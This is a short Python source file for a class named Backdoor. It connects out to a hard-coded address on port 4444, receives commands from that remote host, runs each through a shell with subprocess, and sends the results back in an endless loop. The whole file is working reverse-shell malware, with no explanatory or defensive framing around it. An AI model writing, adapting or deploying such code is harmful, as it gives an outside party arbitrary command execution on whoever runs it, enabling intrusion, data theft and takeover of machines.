import socket
import subprocess
import json

import base64


class Backdoor:
    def __init__(self,ip,port):
        self.con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.con.connect((ip,port))

    def execute_command(self,command):
        return subprocess.check_output(command,shell=True)

    def box_send(self,data):
         json_data = json.dumps(data.decode('cp866'))
         self.con.send(json_data.encode()) 


    def box_recive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.con.recv(1024).decode('cp866'))
                return json.loads(json_data)
            except ValueError:
                continue    

    def run(self):
        while True:
            command = self.box_recive() 
            command_result = self.execute_command(command)          
            self.box_send(command_result)

backdoor = Backdoor("192.168.139.56",4444)
backdoor.run()